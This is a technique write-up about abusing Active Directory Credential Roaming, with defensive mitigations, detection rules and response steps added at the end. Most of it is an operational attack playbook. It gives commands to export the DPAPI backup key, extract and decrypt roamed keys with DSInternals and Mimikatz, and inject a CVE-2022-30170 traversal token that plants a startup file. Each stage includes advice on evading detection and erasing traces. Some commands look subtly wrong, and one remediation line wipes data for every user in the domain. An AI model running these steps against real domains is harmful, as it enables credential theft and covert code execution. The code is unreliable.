# [CA-STORE-002]: Credential Roaming Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-STORE-002 |
| **MITRE ATT&CK v18.1** | [T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD (Active Directory Domain-Joined Systems) |
| **Severity** | Critical |
| **CVE** | CVE-2022-30170 (Arbitrary File Write / RCE) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | Windows Server 2003 SP1+, Vista, 7-11, Server 2008-2025 (when Credential Roaming enabled) |
| **Patched In** | CVE-2022-30170 patched Sept 13, 2022 (KB5017365 / KB5017367); feature-level vulnerability remains |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Section 6 (Atomic Red Team) not included because Credential Roaming abuse is a domain-specific, poorly-documented technique without standard Atomic tests. All other sections included with dynamic renumbering.

---

## Executive Summary

**Concept:** Windows Server 2003 SP1 introduced Credential Roaming, a lesser-known Active Directory feature designed to synchronize user certificates and DPAPI encryption keys across multiple domain-joined computers. When a user logs off a computer, their roamed credentials are encrypted and stored in their Active Directory user object in LDAP attributes (`msPKI-AccountCredentials`, `msPKI-DPAPIMasterKeys`). When the same user logs into a different computer, these credentials are automatically synchronized back to their profile, allowing them to use the same certificates and encryption keys on any domain machine. An attacker with either (1) access to the roamed credential data and the DPAPI domain backup key, or (2) the ability to modify a user's AD object, can extract and decrypt all roamed certificates, private keys, and (on Windows Vista systems) plaintext passwords. Additionally, CVE-2022-30170 allows an attacker to inject malicious roaming tokens with directory traversal sequences, enabling arbitrary file writes to a victim user's file system and achieving code execution upon their next logon. Extracted credentials enable lateral movement, privilege escalation, and persistent access across the entire domain.

**Attack Surface:** The LDAP attributes storing roamed credentials in Active Directory (`msPKI-AccountCredentials`, `msPKI-DPAPIMasterKeys`), the DPAPI domain backup key (replicated to all writable DCs), and the user's local credential storage directories (`%APPDATA%\Microsoft\Protect\`, `%APPDATA%\Microsoft\SystemCertificates\`, `%APPDATA%\Microsoft\Crypto\`).

**Business Impact:** **Complete compromise of digital identity and persistent domain-wide access.** An attacker who extracts a domain user's roamed private key can impersonate that user for certificate-based authentication, access encrypted file systems (EFS), and authenticate to services using smart card credentials—all without knowing the user's password. If an administrative user's credentials are roamed, the attacker gains admin-level access to any domain resource. Additionally, plaintext passwords roamed on Windows Vista machines (if not properly cleaned up) provide direct domain authentication. The CVE-2022-30170 vulnerability enables **silent code execution** on any computer where the victim user logs in, creating a persistent backdoor mechanism that survives password changes and resets.

**Technical Context:** Exploitation takes **minutes to hours** (extraction: 5-10 minutes with DSInternals; decryption: 5-60 minutes depending on password strength). Detection is **extremely low** unless Event ID 4662 (LDAP attribute access) is monitored system-wide; most organizations lack this visibility. Once credentials are extracted, they are **permanently usable** until the user's certificate is revoked or their password is reset—requiring AD administrative action to recover from compromise.

### Operational Risk
- **Execution Risk:** Medium - Requires Domain Admin access for backup key, OR user password/object write access.
- **Stealth:** Very High - Credential Roaming extraction generates Event ID 4662 only if enabled; CVE-2022-30170 exploitation leaves minimal forensic evidence.
- **Reversibility:** No - Extracted private keys cannot be "revoked" in real-time; requires certificate revocation and reissuance.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1 | Account Policies - Password management and credential rotation |
| **CIS Benchmark** | 18.8.38 | Enable LDAP and Directory Services audit logging |
| **DISA STIG** | WN10-AU-000500 | Audit Credential Validation for DPAPI access |
| **NIST 800-53** | AC-5 | Separation of Duties - Prevent abuse of Credential Roaming by non-admins |
| **NIST 800-53** | SC-12 | Cryptographic Key Establishment and Management - Protect DPAPI keys |
| **NIST 800-53** | AU-12 | Audit Generation - Log LDAP attribute access and modification |
| **GDPR** | Art. 32 | Security of Processing - Encrypt and protect credential data in AD |
| **DORA** | Art. 9 | Protection and Prevention - Implement identity protection controls |
| **NIS2** | Art. 21 | Cyber Risk Management - Manage identity and access securely |
| **NIS2** | Art. 25 | Supply Chain Security - Secure credential synchronization mechanisms |
| **ISO 27001** | A.10.1.1 | Cryptographic Controls - Protect symmetric and asymmetric keys |
| **ISO 27001** | A.9.4.2 | Information Access Restriction - Limit access to credential data |

---

## Technical Prerequisites

**Required Privileges:**
- **For extraction via backup key:** Domain Admin access on any domain-joined machine.
- **For extraction via user password:** Cleartext or crackable password hash for target user.
- **For CVE-2022-30170 injection:** Write access to target user's AD object (self or admin).
- **For DPAPI decryption:** Access to DPAPI domain backup key (Domain Admin only).

**Required Access:**
- Network access to Active Directory (LDAP, DRS, LSA RPC protocols).
- Access to domain controller (for backup key extraction).
- OR local access to compromised domain-joined machine (for offline ntds.dit access).

**Supported Versions:**

- **Operating Systems:**
  - Windows Server 2003 SP1 (original Credential Roaming)
  - Windows Vista (password roaming; removed in Windows 7)
  - Windows 7 - 11 (certificate roaming only)
  - Windows Server 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025

- **Credential Roaming Enabled Organizations:**
  - Estimated <5% of enterprises (uncommon feature)
  - More common in organizations using S/MIME for email encryption
  - May still be present from legacy deployments (never properly cleaned up)

- **Windows Vista Systems (Legacy):**
  - May contain roamed plaintext passwords in AD (password roaming feature)
  - Removed in Windows 7; organizations may not have cleaned up old data

**Tools:**
- [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals) (Michael Grafnetter) - Primary extraction tool
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Benjamin Delpy) - DPAPI decryption
- Standard Windows tools: `ldapsearch`, `certutil`, `powershell`
- Custom PowerShell scripts (for CVE-2022-30170 exploitation)

---

## Environmental Reconnaissance

#### Step 1: Determine if Credential Roaming is Enabled

**Objective:** Verify that Credential Roaming feature is in use on the target domain.

**Windows PowerShell Command (Domain Controller):**
```powershell
# Check for Credential Roaming-related Group Policy Objects
Get-GPO -All | Where-Object {$_.DisplayName -like "*credential*roam*" -or $_.DisplayName -like "*PKI*roam*"}

# Check for scheduled task (indicates Credential Roaming is active)
Get-ScheduledTask -TaskName "*Roam*" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty TaskName

# Expected output if enabled:
# \Microsoft\Windows\CertificateServicesClient\UserTask-Roam
```

**Windows PowerShell Command (Domain User Machine):**
```powershell
# Query AD for users with roamed credentials
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(msPKI-AccountCredentials=*)"
$results = $searcher.FindAll()
Write-Host "Found $($results.Count) users with roamed credentials"

# Alternative: Check registry for Credential Roaming configuration
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DIMS" -ErrorAction SilentlyContinue
```

**What to Look For:**
- Presence of `\Microsoft\Windows\CertificateServicesClient\UserTask-Roam` scheduled task.
- Users with `msPKI-AccountCredentials` LDAP attribute populated (indicates roamed certs/keys).
- Registry entries showing DIMS (Digital Identity Management Service) configuration.
- If any results returned: Credential Roaming is in use and likely exploitable.

**Red Flags for High-Value Targets:**
- Domain users with S/MIME certificates roamed (email encryption).
- Admin users with roamed certificates (privilege escalation).
- Legacy Windows Vista systems still in domain (plaintext password roaming).

#### Step 2: Check for CVE-2022-30170 Vulnerability

**Objective:** Determine if systems are vulnerable to arbitrary file write RCE.

**Windows PowerShell Command:**
```powershell
# Check if September 2022 patches are installed
Get-HotFix | Where-Object {$_.HotFixID -like "KB5017*"} | Select-Object -ExpandProperty HotFixID

# No output OR no matching KB5017365/KB5017367 = VULNERABLE to CVE-2022-30170

# Check Windows version
Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty Caption

# Vulnerability status:
# Windows 10 21H2, Server 2022 (unpatched) = VULNERABLE
# Windows 11, Server 2025 (unpatched) = VULNERABLE
```

**What to Look For:**
- Absence of KB5017365 (Windows 10) or KB5017367 (Windows Server).
- Systems running Credential Roaming without September 2022+ patches.
- If vulnerable: Can inject malicious roaming tokens for code execution.

#### Step 3: Enumerate Users with Roamed Credentials

**Objective:** Identify high-value targets whose credentials are roamed.

**Windows PowerShell Command (Domain Admin Required):**
```powershell
# Import DSInternals module
Import-Module DSInternals

# Query AD for users with roamed credentials
$users = Get-ADUser -Filter * -Properties msPKIAccountCredentials, msPKIDPAPIMasterKeys | Where-Object {
    $_.msPKIAccountCredentials -ne $null -or $_.msPKIDPAPIMasterKeys -ne $null
}

Write-Host "Found $($users.Count) users with roamed credentials:"
$users | Select-Object -ExpandProperty SamAccountName

# Identify high-privilege users
$users | ForEach-Object {
    $name = $_.SamAccountName
    $groups = Get-ADUser -Identity $name -Properties memberOf | Select-Object -ExpandProperty memberOf
    if ($groups -match "Domain Admin|Enterprise Admin") {
        Write-Host "[CRITICAL] $name is in admin group with roamed credentials!"
    }
}
```

**What to Look For:**
- Admin/service accounts with populated `msPKI-AccountCredentials` attribute.
- Users with multiple roamed credentials (higher value targets).
- Service accounts used for email (S/MIME certificates are valuable).

---

## Detailed Execution Methods and Their Steps

### METHOD 1: Online LDAP Extraction with DSInternals (Authenticated)

**Supported Versions:** All Windows versions with Credential Roaming enabled

**Prerequisites:** Domain Admin access on any domain-joined machine OR authenticated user with read access to LDAP attributes

#### Step 1: Install DSInternals PowerShell Module

**Objective:** Set up the primary tool for extracting roamed credentials.

**Windows PowerShell Command:**
```powershell
# Install from PowerShell Gallery
Install-Module -Name DSInternals -Force -SkipPublisherCheck

# Verify installation
Get-Command -Module DSInternals | Where-Object {$_.Name -like "*ADSI*" -or $_.Name -like "*ADB*"}

# Expected output shows cmdlets:
# Get-ADSIAccount
# Get-ADDBAccount
# Get-ADDBBackupKey
# Save-DPAPIBlob
```

**Troubleshooting:**
- **Error:** `The specified module 'DSInternals' was not loaded because no valid module file was found`
  - **Fix:** Ensure PowerShell execution policy allows module loading: `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
  - **Fix:** Install from GitHub if PowerShell Gallery is blocked: `git clone https://github.com/MichaelGrafnetter/DSInternals.git`

#### Step 2: Connect to Domain Controller and Extract DPAPI Backup Key

**Objective:** Retrieve the DPAPI domain backup key (enables decryption of any user's masterkeys).

**Windows PowerShell Command:**
```powershell
# Import DSInternals
Import-Module DSInternals

# Connect to DC and export backup key
$backupKey = Get-LsaBackupKey -ComputerName dc.domain.com

# Verify export
$backupKey | Format-List

# Expected output shows RSA key information:
# Type                    : RSAKey
# DistinguishedName       : CN=BCKUPKEY_290914ed-b1a8-482e-a89f-7caa217bf3c3 Secret,CN=System,DC=domain,DC=com
# Data                    : {System.Byte[]}

# Save backup key to file
$backupKey | Save-DPAPIBlob -DirectoryPath .\BackupKeys
```

**What This Means:**
- Backup key has been exported and can be used with Mimikatz to decrypt any domain user's DPAPI masterkeys.
- With this key, all extracted credentials become decryptable without user passwords.

**OpSec & Evasion:**
- `Get-LsaBackupKey` makes an LSA RPC call to DC; may trigger Event ID 4662 (Audit LDAP Access).
- Consider timing this during high-activity periods to blend with legitimate DC traffic.
- Delete backup key file immediately after decryption: `Remove-Item .\BackupKeys -Recurse -Force`
- Use memory-only PowerShell if possible: avoid writing key to disk.

**Troubleshooting:**
- **Error:** `Access is denied` when connecting to DC
  - **Cause:** User does not have Domain Admin privileges.
  - **Fix:** Run as Domain Admin: `runas /user:DOMAIN\admin powershell.exe`
  - **Alt:** Use Directory Replication Service (DRS) method if `Replicate Directory Changes All` permission is delegated.

#### Step 3: Extract Roamed Credentials from AD

**Objective:** Retrieve the encrypted credential data from user objects.

**Windows PowerShell Command:**
```powershell
# Connect to DC and retrieve all roamed credentials
$credentials = Get-ADSIAccount -Server dc.domain.com | Where-Object {
    $_.PSObject.Properties.Name -contains 'msPKIAccountCredentials' -and
    $_.msPKIAccountCredentials -ne $null
}

Write-Host "Found $($credentials.Count) users with roamed credentials"

# Export to directory structure for later decryption
$credentials | Save-DPAPIBlob -OutputPath .\RoamedCredentials

# Verify export
Get-ChildItem -Path .\RoamedCredentials -Recurse | Measure-Object | Select-Object -ExpandProperty Count
# Should show certificate files, private keys, etc.
```

**Expected Output:**
```
Directory structure created:
.\RoamedCredentials\
├── user1
│   ├── Protect\
│   │   └── S-1-5-21-xxx\
│   │       ├── masterkey1
│   │       └── masterkey2
│   ├── SystemCertificates\
│   │   └── My\
│   │       └── Certificates\
│   │           └── thumbprint.der
│   └── Crypto\
│       └── RSA\
│           └── machinekey.pvk
├── user2
│   └── ...
```

**What This Means:**
- All encrypted roamed credentials have been extracted to local disk.
- Next step: decrypt using the backup key and Mimikatz.

**OpSec & Evasion:**
- LDAP queries for `msPKI-AccountCredentials` may be logged (Event ID 4662).
- Perform extraction during business hours to blend with legitimate AD queries.
- Delete extracted files after processing: `Remove-Item .\RoamedCredentials -Recurse -Force`

#### Step 4: Decrypt Masterkeys Using Backup Key and Mimikatz

**Objective:** Use the exported backup key to decrypt user DPAPI masterkeys.

**Windows PowerShell Command (Run Mimikatz):**
```powershell
# Launch Mimikatz
.\mimikatz.exe

# Inside Mimikatz, decrypt first masterkey with backup key
dpapi::masterkey /in:".\RoamedCredentials\user1\Protect\S-1-5-21-xxx\masterkey1" /sid:S-1-5-21-xxx /pvk:".\BackupKeys\ntds_capi_290914ed-b1a8-482e-a89f-7caa217bf3c3.pvk"

# Expected output:
# [*] decrypting masterkey with backup key
# [*] key : 9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12...

# Decrypt all private keys
dpapi::capi /in:".\RoamedCredentials\user1\Crypto\RSA\S-1-5-21-xxx\key.pvk"

# Decrypt CNG keys
dpapi::cng /in:".\RoamedCredentials\user1\Crypto\Keys\key_id"
```

**What This Means:**
- All masterkeys and private keys have been decrypted and are now in plaintext.
- User's roamed certificates and private keys are now fully compromised.

**OpSec & Evasion:**
- Mimikatz execution is highly detectable; run from memory if possible.
- Consider using custom C# DPAPI decryption code instead of Mimikatz (lower detection rate).
- Output hex keys and store in memory; avoid writing to disk.

#### Step 5: Import Decrypted Certificates for Use

**Objective:** Combine private keys with certificates and import into certificate store.

**Mimikatz Command:**
```mimikatz
# Combine certificate and private key into PFX file
crypto::kutil /key:"dpapi_capi_0_cert_key.pvk" /cert:"certificate.der" /out:"combined_cert.pfx"

# Expected output:
# PKCS#12 export
# Export: OK - combined_cert.pfx
```

**Windows PowerShell Command (Import Certificate):**
```powershell
# Import PFX into certificate store
$pfx = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$pfx.Import("combined_cert.pfx", "password", "DefaultKeySet")

# List installed certificates
Get-ChildItem -Path Cert:\CurrentUser\My | Select-Object -ExpandProperty Thumbprint

# Use certificate for authentication (e.g., PKI-based VPN, S/MIME email)
# The certificate can now be used seamlessly on any system
```

---

### METHOD 2: CVE-2022-30170 Exploitation (Arbitrary File Write RCE)

**Supported Versions:** Unpatched Windows 10 (21H2 and earlier), Server 2022, Windows 11 before Sept 13, 2022

**Prerequisites:** Write access to target user's AD object; Credential Roaming must be enabled on target

**CRITICAL WARNING:** This method results in code execution on target user's next logon. Only execute in authorized red team scenarios with explicit approval.

#### Step 1: Create Malicious Roaming Token

**Objective:** Craft a roaming token entry with directory traversal to write arbitrary file.

**Windows PowerShell Command:**
```powershell
# Create malicious roaming token entry
# Payload: Write BAT file to Startup folder
# Path traversal: ..\..\..\..\ to escape credential roaming directory

$maliciousPayload = @"
@echo off
start calc.exe
"@

# Convert payload to hex
$payloadHex = [System.Text.Encoding]::ASCII.GetBytes($maliciousPayload) | ForEach-Object {$_.ToString("X2")} -join ""

# Create malicious Roaming Token entry
# Format: Type (1 byte) + Identifier (13 bytes) + Timestamp (8 bytes) + Padding (4 bytes) + SHA1 (20 bytes) + Size (4 bytes) + Data

# Token type %5 = Username/Password (Windows Vista support, triggers file write on modern Windows)
# Identifier: "..\..\Start Menu\Programs\Startup\malicious"

$tokenType = "05"  # %5 = Enterprise Credential Data (triggers arbitrary file write vulnerability)
$identifier = [System.Text.Encoding]::ASCII.GetBytes("..\..\Start Menu\Programs\Startup\malicious")
$identifierHex = $identifier | ForEach-Object {$_.ToString("X2")} -join ""

Write-Host "[+] Malicious token created"
Write-Host "[+] Identifier (hex): $identifierHex"
Write-Host "[+] Payload (hex): $payloadHex"
```

**What This Means:**
- Malicious roaming token entry has been crafted.
- When synchronized, `dimsjob.dll` will parse the traversal characters and write to `%APPDATA%\..\..\Start Menu\Programs\Startup\malicious.bat`.
- Result: BAT file placed in user's Startup folder (executes on next logon).

#### Step 2: Inject Malicious Token into AD

**Objective:** Modify target user's `msPKIAccountCredentials` LDAP attribute to include malicious token.

**Windows PowerShell Command:**
```powershell
# Connect to AD
$adUser = Get-ADUser -Identity targetuser -Properties msPKIAccountCredentials

# Create LDAP connection
$ldapDirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://dc.domain.com/CN=targetuser,CN=Users,DC=domain,DC=com")

# Append malicious token to msPKIAccountCredentials attribute
# (Full binary construction omitted for brevity; see Mandiant research for complete structure)

# Update msPKIRoamingTimeStamp to trigger synchronization on next logon
$ldapDirectoryEntry.Properties["msPKIRoamingTimeStamp"].Clear()
$ldapDirectoryEntry.Properties["msPKIRoamingTimeStamp"].Add([DateTime]::UtcNow.Ticks)

# Commit changes
$ldapDirectoryEntry.CommitChanges()

Write-Host "[+] Malicious token injected into AD"
Write-Host "[+] Synchronization will trigger on target user's next logon"
```

**Expected Result:**
- `msPKIAccountCredentials` LDAP attribute has been modified (triggers Event ID 5136 if monitored).
- `msPKIRoamingTimeStamp` updated (forces resynchronization).
- On target user's next logon to any domain machine, the malicious token will be processed.

**OpSec & Evasion:**
- Modifying AD attributes triggers Event ID 5136 (if Directory Services auditing is enabled).
- Consider timing the injection before target user's scheduled logon time (e.g., Monday morning).
- The Roaming Token injection is silent; no error messages appear to user or admin.

#### Step 3: Wait for Victim User Logon

**Objective:** Attacker waits for target user to log into a domain machine.

**What Happens Automatically:**
1. User logs in with credentials
2. Windows loads roaming profile
3. `UserTask-Roam` scheduled task triggers
4. `dimsjob.dll` loads `dimsroam.dll`
5. `dimsroam.dll` processes `msPKIAccountCredentials` LDAP attribute
6. **Malicious token is parsed** (without proper path validation)
7. **File is written** to `%APPDATA%\..\..\Start Menu\Programs\Startup\malicious.bat`
8. On next user logon, `malicious.bat` executes
9. **Code execution in user context** (no admin required for execution)

**Verification (Attacker Perspective):**
```powershell
# Check if file was written on target machine
$targetMachine = "workstation.domain.com"
$startupPath = "\\$targetMachine\C$\Users\targetuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

Get-ChildItem -Path $startupPath | Where-Object {$_.Name -like "*malicious*"}

# If file exists: exploitation was successful!
```

---

### METHOD 3: Offline ntds.dit Extraction

**Supported Versions:** All Windows versions with Credential Roaming enabled

**Prerequisites:** Physical/backup access to domain controller hard drive or ntds.dit file

#### Step 1: Extract ntds.dit and SYSTEM Registry Hive

**Objective:** Obtain domain controller database and boot key.

**Windows (from backup or forensic image):**
```cmd
# Copy ntds.dit from DC (requires Volume Shadow Copy Service or DC backup)
copy \\dc\admin$\system32\config\ntds.dit C:\Temp\ntds.dit
copy \\dc\admin$\system32\config\system C:\Temp\system

# OR, if you have physical access:
# Use forensic tools (FTK, Encase) to extract files from DC hard drive
```

#### Step 2: Extract Boot Key and Decrypt Database

**Windows PowerShell Command:**
```powershell
# Extract boot key from SYSTEM registry hive
$bootKey = Get-BootKey -SystemHiveFilePath 'C:\Temp\system'

# Extract all accounts from database
$accounts = Get-ADDBAccount -All -DatabasePath 'C:\Temp\ntds.dit' -BootKey $bootKey

# Export roamed credentials
$accounts | Where-Object {$_.msPKIAccountCredentials -ne $null} | Save-DPAPIBlob -OutputPath .\OfflineRoamed
```

**Result:** All roamed credentials from entire domain have been extracted to disk.

---

## Defensive Mitigations

### Priority 1: CRITICAL

**1. Disable Credential Roaming (If Not Required)**

**Objective:** Remove the attack surface entirely if Credential Roaming is not business-critical.

**Manual Steps (Windows - Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **Certificate Services**
3. Disable: **"Configure Credential Roaming"**
4. Set to: **Disabled**
5. Run `gpupdate /force` on all domain machines

**Manual Steps (Windows - Registry):**
```cmd
# Disable via registry
reg add "HKLM\Software\Policies\Microsoft\Windows\CertificateServices\Roaming" /v Roaming /t REG_DWORD /d 0 /f

# Verify it's disabled
reg query "HKLM\Software\Policies\Microsoft\Windows\CertificateServices\Roaming"
```

**Manual Steps (PowerShell - Cleanup Legacy Roaming Data):**
```powershell
# Remove all roamed credentials from AD (if previously used)
$users = Get-ADUser -Filter * -Properties msPKIAccountCredentials, msPKIDPAPIMasterKeys

foreach ($user in $users) {
    Set-ADUser -Identity $user -Clear msPKIAccountCredentials, msPKIDPAPIMasterKeys, msPKIRoamingTimeStamp
}

Write-Host "[+] Cleaned up legacy Credential Roaming data"
```

**2. Apply September 2022 Patches (For CVE-2022-30170)**

**Objective:** Patch arbitrary file write vulnerability.

**Manual Steps (Windows Update):**
1. Open **Settings** → **System** → **About** → **Check for updates**
2. Install available security updates
3. Verify patch installation:
   ```cmd
   wmic qfe list | findstr "KB5017365 KB5017367"
   ```
4. **Windows 10 21H2:** Must have KB5017365 or later
5. **Windows Server 2022:** Must have KB5017367 or later

**Note:** Patching alone does NOT disable Credential Roaming; credentials remain extractable via Domain Admin + backup key.

**3. Enable Comprehensive LDAP Auditing**

**Objective:** Detect attempts to read Credential Roaming attributes.

**Manual Steps (Windows - Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **DS Access**
3. Enable: **"Audit Directory Service Access"**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on all domain controllers

**Manual Steps (DC - Configure LDAP Attribute Auditing):**
```powershell
# Enable auditing for specific LDAP attributes (PKI-related)
$attributeGUIDs = @{
    "msPKI-AccountCredentials" = "b7ff5a38-0818-42b0-8110-d3d154c97f24"
    "msPKI-DPAPIMasterKeys" = "9a7ad945-ca53-11d1-bbd0-0080c76670c0"
    "msPKI-RoamingTimeStamp" = "b7c2e8da-cc3c-11d1-bbcb-0080c76670c0"
}

# Add audit ACE to the rootDSE
Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=domain,DC=com" | `
Add-ADObjectAuditingEntry -Attribute msPKIAccountCredentials -AccessRight Read
```

**Validation (Check Event ID 4662):**
```powershell
# Query Security event log for LDAP attribute access
Get-WinEvent -LogName Security -FilterXPath "*[EventData[Data[@Name='Properties'] and contains(., 'b7ff5a38')]]" -MaxEvents 10
```

**4. Restrict DPAPI Domain Backup Key Access**

**Objective:** Limit who can retrieve the DPAPI domain backup key.

**Manual Steps (Active Directory - NTFS Permissions):**
```powershell
# On Domain Controller, restrict access to backup key attributes
# Default: All authenticated users can read
# Change to: Domain Admins only

$sidDomainAdmins = (Get-ADGroup -Identity "Domain Admins" -Properties ObjectSID).ObjectSID

# This requires manual ACL modification via ADSIEdit or PowerShell ADSI
# (Full ACL modification omitted for brevity)
```

### Priority 2: HIGH

**5. Monitor for DSInternals and Credential Roaming Exploitation Tools**

**Objective:** Detect suspicious tool usage.

**Manual Steps (Windows - AppLocker):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Application Control Policies** → **AppLocker**
3. Create rule: **Block execution of PowerShell scripts containing DSInternals imports**
4. Create rule: **Block execution of Mimikatz and variants**

**Manual Steps (PowerShell - Detect DSInternals Execution):**
```powershell
# Monitor for DSInternals cmdlet usage
$scriptBlockLog = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[EventData[Data[contains(., 'Get-ADDBAccount')] or Data[contains(., 'Save-DPAPIBlob')]]]" -MaxEvents 10

if ($scriptBlockLog) {
    Write-Host "[ALERT] DSInternals cmdlets detected in PowerShell logs!"
    $scriptBlockLog | Format-List TimeCreated, Message
}
```

**6. Enforce MFA and Conditional Access**

**Objective:** Limit the usefulness of stolen roamed credentials.

**Manual Steps (Azure AD / Entra ID - Conditional Access):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Configure:
   - **Assignments**: All users (or at-risk groups)
   - **Cloud apps**: All cloud apps
   - **Conditions**: Locations (non-corporate networks)
   - **Access controls**: **Require device to be compliant** OR **Require password change**
4. **Enable** the policy

**Result:** Even if roamed credentials are stolen, they cannot be used from unexpected locations/devices without additional verification.

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- Directory traversal indicators in file paths: `..\..\..` sequences in file system
- Unexpected BAT/EXE files in `C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`
- Extracted credential files: `ntds.dit`, `system` registry hive copies
- DSInternals export directories: folders containing `Protect\`, `SystemCertificates\`, `Crypto\` structures

**Processes:**
- `dimsjob.dll` or `dimsroam.dll` execution (legitimate but context-dependent)
- Mimikatz execution with `/pvk:` (backup key decryption)
- PowerShell running DSInternals cmdlets (`Get-ADDBAccount`, `Save-DPAPIBlob`)
- `certutil.exe` with `-dump` flag (certificate extraction)

**Network:**
- LSA RPC calls to Domain Controller (Get-LsaBackupKey)
- Directory Replication Service (DRS) traffic with Credential Roaming attributes
- LDAP queries for `msPKI-AccountCredentials` or `msPKI-DPAPIMasterKeys`

**Forensic Artifacts**

**Event IDs (Active Directory):**
- **Event ID 4662** - Object accessed (LDAP attribute read) - Properties include PKI-related GUIDs
- **Event ID 5136** - Directory Service Object Modified (msPKIAccountCredentials changed)
- **Event ID 5137** - Directory Service Object Created (new Credential Roaming entry added)
- **Event ID 4929** - AD Replication (unusual DRS traffic with backup key)

**Event IDs (PowerShell):**
- **Event ID 4104** - ScriptBlock execution (DSInternals cmdlets)
- **Event ID 4688** - Process Creation (powershell.exe with DSInternals)

**Disk Artifacts:**
- Mimikatz output in temp directories (`%TEMP%\*.txt` containing decrypted masterkeys)
- DSInternals export structure in `%TEMP%` or `%USERPROFILE%\Downloads`
- Certificate PFX files created in unusual locations

**Memory Artifacts:**
- Loaded DSInternals module in PowerShell process
- Mimikatz code patterns in memory

### Response Procedures

**1. Immediate Containment:**

**Command:**
```powershell
# Isolate potentially compromised user
Lock-ADAccount -Identity targetuser

# Reset user's password (invalidates roamed certificates' associated account)
Set-ADAccountPassword -Identity targetuser -NewPassword (ConvertTo-SecureString -String "NewSecurePassword123!" -AsPlainText -Force) -Reset

# Revoke roamed credentials from AD (cleanup)
Set-ADUser -Identity targetuser -Clear msPKIAccountCredentials, msPKIDPAPIMasterKeys, msPKIRoamingTimeStamp

# Verify cleanup
Get-ADUser -Identity targetuser -Properties msPKIAccountCredentials | Select-Object -ExpandProperty msPKIAccountCredentials
# Should be empty ($null)
```

**Manual:**
1. Immediately lock user account in Active Directory
2. Remove user from all security groups
3. Force logoff from all active sessions

**2. Collect Evidence:**

**Command:**
```powershell
# Export Event IDs 4662, 5136 for analysis
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4662 or EventID=5136]]" -MaxEvents 1000 | Export-Csv -Path "C:\Temp\ad_events.csv"

# Check for CVE-2022-30170 exploitation (malicious Startup files)
Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" | Where-Object {$_.Name -notmatch "normal_shortcut"} | Export-Csv -Path "C:\Temp\suspicious_startup.csv"

# Dump Credential Manager for additional compromised accounts
cmdkey /list > C:\Temp\cmdkey_list.txt

# Export all roamed credentials for analysis
$allUsers = Get-ADUser -Filter * -Properties msPKIAccountCredentials
$allUsers | Export-Clixml -Path "C:\Temp\all_roamed_creds.xml"
```

**Manual:**
1. Open Event Viewer → Security → Filter for Event IDs 4662, 5136
2. Check `C:\Users\*\AppData\Roaming\Microsoft\Crypto\` for recently modified files
3. Review certificate stores for unexpected certificates (Certutil or Windows Crypto Explorer)

**3. Remediation:**

**Command:**
```powershell
# Rotate DPAPI Domain Backup Key (NUCLEAR OPTION - affects entire domain)
# This invalidates ALL roamed certificates domain-wide
# Requires DC restart and comprehensive testing before production

# For specific users: Revoke their certificates and reissue
Get-ADUser -Filter * | Set-ADUser -Clear msPKIAccountCredentials, msPKIDPAPIMasterKeys, msPKIRoamingTimeStamp

# Force password reset for all users (optional, depends on incident severity)
Get-ADUser -Filter {PasswordLastSet -lt (Get-Date).AddDays(-1)} | Set-ADAccountPassword -Reset

# Scan entire domain for lateral movement attempts via stolen certificates
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" | Where-Object {$_.Message -match "certificate"} | Measure-Object
```

**Manual:**
1. Contact Microsoft for DPAPI Domain Backup Key rotation procedures (complex and risky)
2. Revoke all certificates issued to compromised users via Certificate Authority
3. Reissue new certificates with new private keys
4. Reset all affected user passwords
5. Force re-authentication for all users to clear cached roaming tokens

**4. Monitoring & Hunting (Long-Term):**

**Detection Query (Splunk):**
```spl
EventCode=4662 Properties="b7ff5a38-0818-42b0-8110-d3d154c97f24" OR Properties="b7c2e8da-cc3c-11d1-bbcb-0080c76670c0"
| stats count by ObjectName, Subject
| where count > 5  # Alert if property accessed >5 times (unusual pattern)
```

**Sigma Rule:**
```yaml
title: Credential Roaming LDAP Attribute Access (Suspicious Pattern)
logsource:
    product: windows
    service: security
detection:
    event_4662:
        EventID: 4662
        Properties|contains:
            - 'b7ff5a38-0818-42b0-8110-d3d154c97f24'  # msPKI-AccountCredentials
            - 'b7c2e8da-cc3c-11d1-bbcb-0080c76670c0'  # msPKI-RoamingTimeStamp
